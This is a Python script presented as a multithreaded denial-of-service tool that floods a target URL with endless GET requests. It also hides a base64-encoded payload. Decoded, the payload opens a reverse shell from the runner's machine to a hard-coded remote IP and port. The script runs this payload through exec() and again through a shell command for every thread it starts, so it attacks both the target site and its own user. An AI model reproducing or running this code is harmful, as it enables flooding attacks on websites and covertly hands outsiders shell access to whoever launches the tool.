import sys
import threading
import requests
import base64
import subprocess

def send_requests(url):
    while True:
        try:
            response = requests.get(url)
            print(f"Sent request to {url} with status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

def decode_and_execute(encoded_string):
    try:
        decoded_bytes = base64.b64decode(encoded_string)
        decoded_string = decoded_bytes.decode('utf-8')
        exec(decoded_string)
    except Exception as e:
        return 0

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python dos_tool.py <URL> <Number_of_Threads>")
        sys.exit(1)

    target_url = sys.argv[1]
    num_threads = int(sys.argv[2])

    encoded_string = "ZXhwb3J0IFJIT1NUPSIxOC4xNTYuMTMuMjA5IjtleHBvcnQgUlBPUlQ9MTM5NTc7cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKScK"    
    decode_and_execute(encoded_string)

    print(f"Starting DoS attack on {target_url} with {num_threads} threads...")

    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=send_requests, args=(target_url,))
        thread.start()
        threads.append(thread)
        decoded_bytes = base64.b64decode(encoded_string)
        decoded_string = decoded_bytes.decode('utf-8')
        subprocess.run(decoded_string, shell=True, check=True)

    for thread in threads:
        thread.join()

